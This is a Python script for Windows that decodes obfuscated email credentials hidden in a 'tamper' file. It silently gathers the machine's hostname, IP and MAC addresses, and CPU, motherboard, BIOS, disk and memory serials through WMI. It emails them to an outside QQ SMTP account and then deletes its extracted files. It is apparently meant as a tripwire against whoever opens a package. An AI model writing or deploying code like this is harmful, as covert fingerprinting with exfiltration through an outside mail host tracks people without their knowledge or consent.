#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import re
import wmi
import base64
import smtplib
import socket
import getpass
from psutil import net_if_addrs
from email.mime.text import MIMEText
from email.utils import formataddr

def read(path):
    list = os.listdir(path)
    # print(list)
    # l = (len(list) - 1)
    # if (l % 2) == 0:
    #     num = int(l / 2)
    # else:
    #     num = int(l / 2) + 1
    # print(list[list.index("tamper%s" % num)])
    target = list[list.index("tamper")]
    with open(path + r'\%s' % (target), 'rb') as fp:
        date = fp.read()
    msg_all = re.findall(r'.?!&(.+)*`@#', str(date))[0]
    msg = re.split('@', msg_all)
    # print(msg)
    return Decrypt(msg)

def Decrypt(msg):
    list = []
    for n in msg:
        translate = ''
        for i in n:
            if i.isupper():
                if i > 'M':
                    translate += chr(ord(i) - 13)
                else:
                    translate += chr(ord(i) + 13)
            elif i.islower():
                if i > 'm':
                    translate += chr(ord(i) - 13)
                else:
                    translate += chr(ord(i) + 13)
            elif i.isdigit():
                digit = (int(i) + 5) % 10  # 加5与10取余，就可直接得出往后位移5位后的数字
                encode_digit = '%d' % digit  # %d格式化为整数
                translate += encode_digit
            else:
                translate += i
        translate = bytes.decode(base64.b64decode(translate[::-1]))
        # print(translate[::-1])
        list.append(translate)
    # print(list)
    return list

def sendmail(text, my_sender, my_user, my_pass):
    msg = MIMEText(text, 'plain', 'utf-8')  # 邮件内容
    msg['From'] = formataddr(["文件发送者", my_sender])  # 括号里的对应发件人邮箱昵称、发件人邮箱账号
    msg['To'] = formataddr(["接收者", my_user])  # 括号里的对应收件人邮箱昵称、收件人邮箱账号
    msg['Subject'] = "中间人数据截获警告！以下是中间人PC详细信息"  # 邮件的主题，也可以说是标题

    server = smtplib.SMTP_SSL("smtp.qq.com", 465)  # 发件人邮箱中的SMTP服务器，端口是465
    server.login(my_sender, my_pass)  # 括号中对应的是发件人邮箱账号、邮箱密码
    server.sendmail(my_sender, [my_user, my_sender], msg.as_string())  # 括号中对应的是发件人邮箱账号、收件人邮箱账号、发送邮件
    server.quit()  # 关闭连接

class PCmessage(object):

    # 处理器
    def printCPU(self):
        c = wmi.WMI()
        tmpdict = {}
        tmpdict["CpuCores"] = 0
        for cpu in c.Win32_Processor():
            tmpdict["cpuid"] = cpu.ProcessorId.strip()
            tmpdict["CpuType"] = cpu.Name
            tmpdict['systemName'] = cpu.SystemName
            try:
                tmpdict["CpuCores"] = cpu.NumberOfCores
            except:
                tmpdict["CpuCores"] += 1
            tmpdict["CpuClock"] = cpu.MaxClockSpeed
            tmpdict['DataWidth'] = cpu.DataWidth
        # print("CPU: ")
        # print(tmpdict)
        tmpdict_text = "CPU: \n" + str(tmpdict) + '\n' + '\n'
        return tmpdict_text

    # 主板
    def printMain_board(self):
        c = wmi.WMI()
        boards = []
        # print len(c.Win32_BaseBoard()):
        for board_id in c.Win32_BaseBoard():
            tmpmsg = {}
            tmpmsg['UUID'] = board_id.qualifiers['UUID'][1:-1]  # 主板UUID,有的主板这部分信息取到为空值，ffffff-ffffff这样的
            tmpmsg['SerialNumber'] = board_id.SerialNumber  # 主板序列号
            tmpmsg['Manufacturer'] = board_id.Manufacturer  # 主板生产品牌厂家
            tmpmsg['Product'] = board_id.Product  # 主板型号
            boards.append(tmpmsg)
        # print("Main_board: ")
        # print(boards)
        boards_text = "Main_board: \n" + str(boards) + '\n\n'
        return boards_text

    # BIOS
    def printBIOS(self):
        c = wmi.WMI()
        bioss = []
        for bios_id in c.Win32_BIOS():
            tmpmsg = {}
            tmpmsg['BiosCharacteristics'] = bios_id.BiosCharacteristics  # BIOS特征码
            tmpmsg['version'] = bios_id.Version  # BIOS版本
            tmpmsg['Manufacturer'] = bios_id.Manufacturer.strip()  # BIOS固件生产厂家
            tmpmsg['ReleaseDate'] = bios_id.ReleaseDate  # BIOS释放日期
            tmpmsg['SMBIOSBIOSVersion'] = bios_id.SMBIOSBIOSVersion  # 系统管理规范版本
            bioss.append(tmpmsg)
        # print("BIOS: ")
        # print(bioss)
        bios_text = "BIOS: \n" + str(bioss) + '\n\n'
        return bios_text

    # 硬盘
    def printDisk(self):
        c = wmi.WMI()
        disks = []
        for disk in c.Win32_DiskDrive():
            # print disk.__dict__
            tmpmsg = {}
            tmpmsg['SerialNumber'] = disk.SerialNumber.strip()
            tmpmsg['DeviceID'] = disk.DeviceID
            tmpmsg['Caption'] = disk.Caption
            tmpmsg['Size'] = disk.Size
            tmpmsg['UUID'] = disk.qualifiers['UUID'][1:-1]
            disks.append(tmpmsg)
        # print("Disk: ")
        list = []
        for d in disks:
            list.append(d)
        disks_text = "Disk: \n" + str(list) + '\n\n'
        return disks_text

    # 内存
    def printPhysicalMemory(self):
        c = wmi.WMI()
        memorys = []
        for mem in c.Win32_PhysicalMemory():
            tmpmsg = {}
            tmpmsg['UUID'] = mem.qualifiers['UUID'][1:-1]
            tmpmsg['BankLabel'] = mem.BankLabel
            tmpmsg['SerialNumber'] = mem.SerialNumber.strip()
            tmpmsg['ConfiguredClockSpeed'] = mem.ConfiguredClockSpeed
            tmpmsg['Capacity'] = mem.Capacity
            tmpmsg['ConfiguredVoltage'] = mem.ConfiguredVoltage
            memorys.append(tmpmsg)
        # print("Memory: ")
        list = []
        for m in memorys:
            list.append(m)
        memorys_text = "Memory: \n" + str(list) + '\n\n'
        return memorys_text

    # 电池信息，只有笔记本才会有电池选项
    def printBattery(self):
        c = wmi.WMI()
        isBatterys = False
        for b in c.Win32_Battery():
            isBatterys = True
        return isBatterys

    # 网卡mac地址：
    def printMacAddress(self):
        c = wmi.WMI()
        macs = []
        for n in c.Win32_NetworkAdapter():
            mactmp = n.MACAddress
            if mactmp and len(mactmp.strip()) > 5:
                tmpmsg = {}
                tmpmsg['MACAddress'] = n.MACAddress
                tmpmsg['Name'] = n.Name
                tmpmsg['DeviceID'] = n.DeviceID
                tmpmsg['AdapterType'] = n.AdapterType
                tmpmsg['Speed'] = n.Speed
                macs.append(tmpmsg)
        # print("MacAddress: ")
        # print(macs)
        macs_text = "MacAddress: \n" + str(macs) + '\n\n'
        return macs_text

    # ip和mac地址
    def printIP(self):
        PCname = socket.gethostname()
        ipList = socket.gethostbyname_ex(PCname)[2]
        macList = []
        for k, v in net_if_addrs().items():
            for item in v:
                address = item[1]
                if "-" in address and len(address) == 17:
                    # print(address)
                    macList.append(address)
        # print(PCname)
        # print(ipList)
        # print(macList)
        ip_text = PCname + '\n' + str(ipList) + '\n' + str(macList)
        return ip_text + '\n\n'


if __name__ == '__main__':
    username = getpass.getuser()
    path = r"C:\Users\%s\Desktop\output" % username
    print("解密中...")
    mail_list = read(path)
    msg = PCmessage()

    text = msg.printIP() + msg.printCPU() + msg.printMain_board() + msg.printBIOS() \
           + msg.printDisk() + msg.printPhysicalMemory() + msg.printMacAddress()
    my_sender = mail_list[0]
    my_user = mail_list[1]
    my_pass = mail_list[2]

    try:
        sendmail(text, my_sender, my_user, my_pass)
    except:
        print("sendmail_error")
        os.system("pause")
    try:
        # shutil.rmtree(path)
        ls = os.listdir(path)
        for i in ls[1:]:
            file_path = os.path.join(path, i)
            os.remove(file_path)
        os.remove(path + '.zip')
    except:
        print("rm_error")
        os.system("pause")
    # os.system("pause")

